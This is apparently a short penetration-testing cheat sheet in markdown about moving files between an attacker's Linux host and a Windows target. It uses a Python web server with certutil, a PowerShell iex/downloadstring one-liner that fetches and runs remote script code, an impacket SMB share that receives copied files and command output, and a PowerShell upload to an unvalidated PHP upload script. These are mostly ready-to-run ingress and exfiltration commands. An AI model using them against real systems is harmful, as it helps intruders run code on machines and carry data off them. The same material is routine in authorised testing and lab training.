Linux to cmd.exe
- [[#Python3 webserver]]

Windows to Linux
- [[#Python3 Samba share]]
- [[#Apache2 php upload]]

# Python3 webserver
From Linux
```bash
python3 -m http.server 82
```

To cmd.exe
```cmd
certutil -urlcache -f http://<ip>:82/<file> <saveAs>
```

Powershell oneliner
```powershell
iex(new-object net.webclient).downloadstring('http://<host>/<file>.ps1')
```


# Python3 Samba share
Start the share
```bash
smbserver.py share . -smb2support -username df -password df
```

Connect from windows
```cmd
net use \\<kali-ip>\share /u:df df
```

**copy** files to share
```cmd
copy <file> \\<ip>\share
```

**write output directly** to share
```cmd
wp.exe > \\<ip>\share
```


# Apache2 php upload
Follow [[#First time setup]] then,

start/restart apache
```bash
sudo systemctl restart apache2
```

upload file
```powershell
powershell (New-Object System.Net.WebClient).UploadFile('http://<destination>/upload.php', '<source file>')
```

stop apache
```bash
sudo systemctl stop apache2
```

## First time setup
Contents of `/var/www/html/upload.php`
```php
<?php
	$uploaddir = '/var/www/uploads/';
	$uploadfile = $uploaddir . $_FILES['file']['name'];
	move_uploaded_file($_FILES['file']['tmp_name'], $uploadfile)
?>
```

Permissions for upload directory
```bash
sudo chown www-data: /var/www/uploads
```
